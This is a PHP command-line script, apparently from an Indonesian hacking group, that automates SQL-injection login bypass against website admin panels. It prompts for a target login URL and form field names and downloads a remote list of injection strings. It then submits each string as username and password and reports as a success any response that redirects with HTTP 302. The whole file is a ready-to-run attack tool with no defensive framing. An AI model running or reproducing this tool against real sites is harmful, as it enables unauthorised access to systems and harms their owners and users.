<?php
$banner = "\e[36;1m

           #         ######
           #    #
  ######   #    #  ##########
           #    #  #        #
           #######        ##
##########      #       ##
                #     ##


[#] Bypass Admin Bruteforce [#]

Coded by : Revan AR
Team   : IndoSec
Github : https//github.com/revan-ar/\n\n\e[0;1m";
echo $banner;
sleep(2);
echo ">>> URL POST : ";
$url = trim(fgets(STDIN));
sleep(2);
echo ">>> FORM USER NAME : ";
$username = trim(fgets(STDIN));
sleep(2);
echo ">>> FORM PASSWORD NAME : ";
$password = trim(fgets(STDIN));
sleep(2);
echo ">>> BUTTON SUBMIT NAME : ";
$submit = trim(fgets(STDIN));
$list = file_get_contents("https://gist.github.com/Fray117/0e408bf23fa76261f74e27ee6f12e41b/raw/b95889d47953a6a47842359587c2d1cd1c32afa0/Sample%2520Query%2520Injection%2520List");
$bypass = explode("\r\n", $list);

  // $x = curl_init();
  //      curl_setopt($x, CURLOPT_URL, "$url");
  //      curl_setopt($x, CURLOPT_RETURNTRANSFER, 1);
  //      curl_setopt($x, CURLOPT_HEADER, 1);
  //      curl_setopt($x, CURLOPT_POST, 1);
  //      curl_setopt($x, CURLOPT_POSTFIELDS, "$username=admiinn&$password=admiinn&$submit=1");
  //      $y = curl_exec($x);
  //      curl_exec($x);

echo "\nRESULT :\n\n";
foreach ($bypass as $query) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "$username=$query&$password=$query&$submit=1");
    $asu = curl_exec($ch);
    curl_close($ch);

    preg_match("/HTTP\/1.1 302/i", $asu, $red);

    if (!empty($red)) {
        echo "{#} $query => BERHASIL\n";
        sleep(1);
    } else {
        echo "{-} $query => GAGAL\n";
        sleep(1);
    }
}
